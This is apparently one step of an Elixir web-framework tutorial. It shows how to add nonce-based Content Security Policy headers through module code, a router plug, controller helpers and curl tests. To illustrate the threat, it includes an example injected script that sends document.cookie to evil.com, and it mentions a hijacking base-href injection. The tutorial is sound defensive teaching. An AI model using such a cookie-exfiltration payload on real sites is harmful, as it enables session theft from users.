# Step 32: Content Security Policy (CSP) Headers

## What We're Building

A Content Security Policy that tells the browser exactly which sources of scripts, styles, images, and connections are allowed. Even if an attacker manages to inject HTML via an XSS vulnerability, the browser will refuse to execute any script that doesn't match the policy.

## The Problem

Without CSP, an XSS attack can do anything:

```html
<!-- Attacker injects this via a stored XSS vulnerability -->
<script>
  // Steal cookies, redirect to phishing site, mine crypto...
  fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>
```

The browser executes it because there's no policy saying "don't run scripts from unknown sources." CSP is a defense-in-depth measure — it doesn't prevent XSS injection, but it limits the damage.

## How CSP Works

The server sends a response header:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```

The browser reads this and enforces it:
- `default-src 'self'` — only load resources from the same origin
- `script-src 'self' 'nonce-abc123'` — only run scripts from same origin OR with `nonce="abc123"`

An injected `<script>alert('xss')</script>` is blocked because it doesn't have the nonce.

## Design Decision: Nonces vs Hashes vs unsafe-inline

| Approach | Security | Practicality |
|----------|----------|--------------|
| `'unsafe-inline'` | Weak — allows ALL inline scripts | Easy, but defeats the purpose |
| **Nonces** | Strong — per-request random value | Requires adding `nonce="..."` to script tags |
| Hashes | Strong — hash of script content | Brittle — changes if you edit the script |

We use **nonces** — the same approach recommended by Google and used in production. Each request gets a unique random nonce. Only `<script>` tags with the matching nonce execute.

## Implementation

### 1. The CSP Module

**Create `lib/ignite/csp.ex`:**

```elixir
# lib/ignite/csp.ex
defmodule Ignite.CSP do
  @nonce_size 16

  def generate_nonce do
    @nonce_size
    |> :crypto.strong_rand_bytes()
    |> Base.url_encode64(padding: false)
  end

  def put_csp_headers(conn) do
    nonce = generate_nonce()

    %Ignite.Conn{
      conn
      | private: Map.put(conn.private, :csp_nonce, nonce),
        resp_headers: Map.put(conn.resp_headers, "content-security-policy", build_header(nonce))
    }
  end

  def csp_nonce(conn) do
    Map.get(conn.private, :csp_nonce, "")
  end

  def csp_script_tag(conn, js_code) do
    nonce = csp_nonce(conn)
    ~s(<script nonce="#{nonce}">#{js_code}</script>)
  end

  def build_header(nonce) do
    [
      "default-src 'self'",
      "script-src 'self' 'nonce-#{nonce}'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data:",
      "connect-src 'self' ws: wss:",
      "font-src 'self'",
      "object-src 'none'",
      "base-uri 'self'",
      "form-action 'self'"
    ]
    |> Enum.join("; ")
  end
end
```

**`generate_nonce/0`** — 16 cryptographically random bytes, base64url-encoded. Different every request.

**`put_csp_headers/1`** — Stores the nonce in `conn.private[:csp_nonce]` (for controllers to read) and adds the CSP header to `conn.resp_headers`.

**`csp_nonce/1`** — Reads the nonce from the conn. Returns `""` if none was set.

**`build_header/1`** — Constructs the full CSP directive string.

### 2. The CSP Policy Explained

```
default-src 'self'
```
Fallback for any resource type not explicitly listed. Only allow same-origin.

```
script-src 'self' 'nonce-abc123'
```
Scripts must come from same origin (`<script src="/assets/ignite.js">`) OR have the correct nonce (`<script nonce="abc123">`). Injected scripts without the nonce are blocked.

```
style-src 'self' 'unsafe-inline'
```
Allow inline `style="..."` attributes. We use these extensively for quick demos. In a production app, you'd move styles to external CSS files and remove `'unsafe-inline'`.

```
img-src 'self' data:
```
Allow images from same origin and `data:` URIs (used by some libraries).

```
connect-src 'self' ws: wss:
```
Allow `fetch()` to same origin and WebSocket connections (required for LiveView).

```
object-src 'none'
```
Block `<object>`, `<embed>`, `<applet>` — legacy plugin formats that are common XSS vectors.

```
base-uri 'self'
```
Prevent attackers from injecting `<base href="https://evil.com">` to hijack relative URLs.

```
form-action 'self'
```
Forms can only submit to the same origin. Prevents form action hijacking.

### 3. Router Plug

**Update `lib/my_app/router.ex`** — add `plug :set_csp_headers` and its implementation:

```elixir
# lib/my_app/router.ex
plug :set_csp_headers

def set_csp_headers(conn) do
  Ignite.CSP.put_csp_headers(conn)
end
```

The plug runs before CSRF validation, so the nonce is available to all controllers.

### 4. Controller Helpers

**Update `lib/ignite/controller.ex`** — add `csp_nonce/1` and `csp_script_tag/2` helpers:

```elixir
# lib/ignite/controller.ex
def csp_nonce(conn) do
  Ignite.CSP.csp_nonce(conn)
end

def csp_script_tag(conn, js_code) do
  Ignite.CSP.csp_script_tag(conn, js_code)
end
```

Controllers already `import Ignite.Controller`, so both helpers are available everywhere.

### 5. Adding Nonces to Inline Scripts

```elixir
# Before (blocked by CSP):
<script>
  document.getElementById("btn").addEventListener("click", ...);
</script>

# After (allowed by CSP):
<script nonce="#{csp_nonce(conn)}">
  document.getElementById("btn").addEventListener("click", ...);
</script>
```

The welcome controller's echo API script now includes the nonce. External scripts (`<script src="/assets/ignite.js">`) don't need nonces — they're covered by `'self'`.

## The Request Lifecycle (With CSP)

```
GET /
  → Cowboy adapter → parse request → create conn
  → Router plug pipeline:
    → log_request ✓
    → add_server_header ✓
    → set_csp_headers:
      → Generate nonce: "Rk9fX2..."
      → Store in conn.private[:csp_nonce]
      → Add header: content-security-policy: ...nonce-Rk9fX2...
    → verify_csrf_token ✓ (GET is safe)
  → Dispatch to WelcomeController.index
  → Controller renders HTML with <script nonce="Rk9fX2...">
  → Response sent with CSP header

Browser receives response:
  → Parses CSP header
  → Finds <script nonce="Rk9fX2..."> → nonce matches → EXECUTE ✓
  → Finds <script src="/assets/ignite.js"> → same origin → EXECUTE ✓
  → If attacker injected <script>evil()</script> → no nonce → BLOCK ✗
```

## Why LiveView Works

LiveView uses:
1. **External scripts** (`/assets/ignite.js`, `/assets/morphdom.min.js`) — allowed by `'self'`
2. **WebSocket connections** (`ws://localhost:4000/live`) — allowed by `connect-src 'self' ws:`
3. **No inline scripts** in the live template — all JS is in external files

The `connect-src` directive is critical — without `ws:` and `wss:`, the browser would block WebSocket connections and LiveView would fail silently.

## Testing

```bash
mix compile
iex -S mix

# 1. Check CSP header is present
curl -I http://localhost:4000/ 2>/dev/null | grep -i security
# → content-security-policy: default-src 'self'; script-src 'self' 'nonce-...'; ...

# 2. Verify nonce changes per request
curl -I http://localhost:4000/ 2>/dev/null | grep nonce
curl -I http://localhost:4000/ 2>/dev/null | grep nonce
# → different nonce values each time

# 3. Browser test — page loads correctly
# Visit http://localhost:4000/ → all content renders
# Click "Send POST" button → echo API works (script has nonce)

# 4. LiveView still works
# Visit http://localhost:4000/counter → WebSocket connects, counter increments

# 5. Verify CSP blocks injected scripts (browser DevTools Console)
# Open DevTools → Console tab
# You should see NO CSP violations for normal page load
# To test blocking: inject a script without nonce via DevTools
```

## Key Concepts

- **Defense in depth**: CSP doesn't prevent XSS injection — it limits the damage. Even if an attacker injects `<script>`, the browser won't execute it without the correct nonce.
- **Nonces vs hashes**: Nonces change per request (dynamic), hashes are tied to script content (static). Nonces are more practical for server-rendered content.
- **`'unsafe-inline'` for styles**: A pragmatic compromise. Inline `style="..."` attributes are too common to nonce individually. Moving to external CSS is the proper fix for maximum security.
- **WebSocket allowance**: `connect-src` must include `ws:` and `wss:` or LiveView silently fails. This is a common gotcha when adding CSP to real-time apps.

## Phoenix Comparison

| Feature | Ignite | Phoenix |
|---------|--------|---------|
| CSP approach | Router plug + nonce | Manual plug (no default) |
| Nonce generation | `crypto.strong_rand_bytes` | `crypto.strong_rand_bytes` |
| Nonce storage | `conn.private[:csp_nonce]` | `conn.private[:csp_nonce]` (convention) |
| Script helper | `csp_nonce(conn)` | Manual `nonce="..."` |
| Style policy | `'unsafe-inline'` | Varies by project |
| WebSocket | `connect-src 'self' ws: wss:` | Same pattern |

Phoenix doesn't include CSP by default — developers add it themselves. Our implementation follows the common community pattern.

## Files Changed

| File | Change |
|------|--------|
| `lib/ignite/csp.ex` | **New** — nonce generation, CSP header building, helpers |
| `lib/ignite/controller.ex` | Added `csp_nonce/1` and `csp_script_tag/2` helpers |
| `lib/my_app/router.ex` | Added `plug :set_csp_headers` with implementation |
| `lib/my_app/controllers/welcome_controller.ex` | Added `nonce="..."` to inline `<script>` tag |

## File Checklist

- [ ] `lib/ignite/csp.ex` — **New**
- [ ] `lib/ignite/controller.ex` — **Modified** (add `csp_nonce/1` and `csp_script_tag/2`)
- [ ] `lib/my_app/router.ex` — **Modified** (add `plug :set_csp_headers`)
- [ ] `lib/my_app/controllers/welcome_controller.ex` — **Modified** (add nonce to inline scripts)

---

[← Previous: Step 31 - CSRF Protection](31-csrf-protection.md) | [Next: Step 33 - `mix ignite.routes` →](33-mix-ignite-routes.md)
